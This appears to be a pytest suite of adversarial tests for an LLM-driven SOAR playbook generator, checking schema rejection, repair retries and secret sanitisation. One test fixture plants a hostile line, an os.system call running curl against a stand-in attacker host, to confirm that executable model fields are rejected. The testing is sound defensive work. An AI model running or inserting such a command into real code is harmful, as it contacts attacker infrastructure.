"""Adversarial tests for bounded model output -> IR decoding."""

from __future__ import annotations

import copy
import json
import sys
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[1] / "soar_playbook_builder"
sys.path.insert(0, str(ROOT))

from llm.decode import GenerationContext, generate_ir  # noqa: E402
from llm.provider import ProviderError  # noqa: E402
from validate.fixtures import (  # noqa: E402
    FIXTURE_EVALUATED_AT,
    qualified_smoke_document,
    qualified_smoke_index,
)


class ScriptedProvider:
    def __init__(self, responses: list[str | Exception]):
        self.responses = list(responses)
        self.calls: list[dict[str, Any]] = []

    def generate(
        self,
        messages,
        *,
        schema=None,
        grammar=None,
        max_tokens=4096,
        temperature=0.0,
        seed=0,
    ):
        self.calls.append(
            {
                "messages": copy.deepcopy(messages),
                "schema": schema,
                "grammar": grammar,
                "max_tokens": max_tokens,
                "temperature": temperature,
                "seed": seed,
            }
        )
        response = self.responses.pop(0)
        if isinstance(response, Exception):
            raise response
        return response


def _context(**changes: Any) -> GenerationContext:
    values: dict[str, Any] = {
        "operating_mode": "air_gapped",
        "model": "local-model@fixture",
        "prompt_version": "ir-generate-v1",
        "generated_at": FIXTURE_EVALUATED_AT,
        "evaluated_at": FIXTURE_EVALUATED_AT,
    }
    values.update(changes)
    return GenerationContext(**values)


def _encoded(document=None) -> str:
    return json.dumps(
        document or qualified_smoke_document(),
        ensure_ascii=False,
        separators=(",", ":"),
    )


def _gap_ids(result) -> set[str]:
    return {gap.id for gap in result.report.gaps}


def test_valid_output_is_authoritatively_stamped_and_preflighted():
    document = qualified_smoke_document()
    document["metadata"].update(
        {
            "capability_index_version": "model-invented-index",
            "operating_mode": "connected",
            "model": "model-self-report",
            "prompt_version": "model-self-report",
            "generated_at": "1970-01-01T00:00:00Z",
        }
    )
    provider = ScriptedProvider([_encoded(document)])

    result = generate_ir(
        provider,
        "Look up the user and summarize the result.",
        qualified_smoke_index(),
        context=_context(),
    )

    assert result.attempts == 1
    assert result.ready_to_compile is True
    assert result.report.status == "ok"
    assert result.ir is not None
    assert result.ir.metadata.capability_index_version == "qualified-v1"
    assert result.ir.metadata.operating_mode == "air_gapped"
    assert result.ir.metadata.model == "local-model@fixture"
    assert result.ir.metadata.prompt_version == "ir-generate-v1"
    assert result.ir.metadata.generated_at == FIXTURE_EVALUATED_AT
    assert provider.calls[0]["schema"]["additionalProperties"] is False
    assert 'root ::=' in provider.calls[0]["grammar"]
    prompt_payload = json.loads(provider.calls[0]["messages"][1]["content"])
    capabilities = prompt_payload["capabilities"]
    assert len(capabilities["actions"]) <= _context().retrieval_action_limit
    assert len(capabilities["templates"]) <= (
        _context().retrieval_template_limit
    )
    assert "apps" not in capabilities


@pytest.mark.parametrize(
    "invalid",
    [
        "```json\n{}\n```",
        '{"schema_version":"1.0.0","schema_version":"1.0.0"}',
        '{"value":NaN}',
        "[]",
    ],
)
def test_invalid_json_shape_is_repaired_without_echoing_raw_output(invalid):
    provider = ScriptedProvider([invalid, _encoded()])
    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(),
    )

    assert result.ready_to_compile is True
    assert result.attempts == 2
    repair_content = provider.calls[1]["messages"][-1]["content"]
    assert invalid not in repair_content
    assert "MODEL_JSON_INVALID" in repair_content


def test_executable_model_field_is_rejected_then_repaired():
    hostile = qualified_smoke_document()
    action = next(node for node in hostile["nodes"] if node["type"] == "action")
    action["python"] = "import os; os.system('curl attacker.invalid')"
    raw_hostile = _encoded(hostile)
    provider = ScriptedProvider([raw_hostile, _encoded()])

    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(),
    )

    assert result.ready_to_compile is True
    repair_content = provider.calls[1]["messages"][-1]["content"]
    assert "UNKNOWN_FIELD" in repair_content
    assert "curl attacker.invalid" not in repair_content
    assert "python" not in result.ir.to_dict()["nodes"][1]


def test_hallucinated_action_is_rejected_by_preflight_then_repaired():
    hallucinated = qualified_smoke_document()
    action = next(
        node for node in hallucinated["nodes"] if node["type"] == "action"
    )
    action["app"] = "invented_security_product"
    action["action"] = "magically resolve incident"
    provider = ScriptedProvider([_encoded(hallucinated), _encoded()])

    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(),
    )

    assert result.ready_to_compile is True
    assert result.attempts == 2
    repair = json.loads(provider.calls[1]["messages"][-1]["content"])
    assert repair["issues"][0]["id"] == "ACTION_APP_UNKNOWN"
    assert repair["issues"][0]["detail"]["app"] == (
        "invented_security_product"
    )


def test_provider_failure_is_sanitized_and_raw_exception_text_is_absent():
    leaked = "Bearer do-not-leak"
    provider = ScriptedProvider(
        [
            ProviderError("TRANSPORT_FAILED", f"socket failed {leaked}"),
            ProviderError("TRANSPORT_FAILED", f"socket failed {leaked}"),
        ]
    )
    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(max_attempts=2),
    )

    assert result.ir is None
    assert result.ready_to_compile is False
    assert _gap_ids(result) == {"MODEL_PROVIDER_FAILED"}
    rendered = result.report.canonical_json()
    assert leaked not in rendered
    assert "TRANSPORT_FAILED" in rendered


def test_transient_provider_failure_can_recover_within_bound():
    provider = ScriptedProvider(
        [
            ProviderError("TIMEOUT", "first request timed out"),
            _encoded(),
        ]
    )
    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(max_attempts=2),
    )
    assert result.ready_to_compile is True
    assert result.attempts == 2
    assert result.report.status == "ok"


def test_invalid_output_repair_exhaustion_never_returns_raw_text():
    secret = "PRIVATE-MODEL-OUTPUT-SECRET"
    provider = ScriptedProvider(
        [
            f"not json {secret}",
            f"still not json {secret}",
            f"never json {secret}",
        ]
    )
    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(max_attempts=3),
    )

    assert result.ir is None
    assert result.ready_to_compile is False
    assert _gap_ids(result) == {
        "MODEL_OUTPUT_INVALID",
        "MODEL_REPAIR_EXHAUSTED",
    }
    assert secret not in json.dumps(result.to_dict())
    assert result.report.ir_sha256 == (
        "e3b0c44298fc1c149afbf4c8996fb924"
        "27ae41e4649b934ca495991b7852b855"
    )


def test_semantic_repair_exhaustion_returns_blocked_valid_ir_for_review():
    hallucinated = qualified_smoke_document()
    action = next(
        node for node in hallucinated["nodes"] if node["type"] == "action"
    )
    action["app"] = "invented_security_product"
    action["action"] = "magically resolve incident"
    provider = ScriptedProvider(
        [_encoded(hallucinated), _encoded(hallucinated)]
    )

    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        qualified_smoke_index(),
        context=_context(max_attempts=2),
    )

    assert result.ir is not None
    assert result.ready_to_compile is False
    assert _gap_ids(result) == {
        "ACTION_APP_UNKNOWN",
        "MODEL_REPAIR_EXHAUSTED",
    }
    assert result.report.ir_sha256 == result.ir.sha256()


def test_nonrepairable_evidence_blocker_stops_without_model_guessing():
    index = qualified_smoke_index()
    index.permissions_status = "unavailable"
    index.action_permissions = {}
    provider = ScriptedProvider([_encoded(), _encoded()])

    result = generate_ir(
        provider,
        "Build the fixture workflow.",
        index,
        context=_context(),
    )

    assert result.ir is not None
    assert result.ready_to_compile is False
    assert _gap_ids(result) == {"PERMISSION_UNVERIFIED"}
    assert result.attempts == 1
    assert len(provider.responses) == 1


def test_generation_policy_bounds_are_enforced_before_provider_call():
    provider = ScriptedProvider([_encoded()])
    with pytest.raises(ValueError, match="generation request exceeds"):
        generate_ir(
            provider,
            "x" * (32 * 1024 + 1),
            qualified_smoke_index(),
            context=_context(),
        )
    assert provider.calls == []

    with pytest.raises(ValueError, match="max_attempts"):
        _context(max_attempts=5)
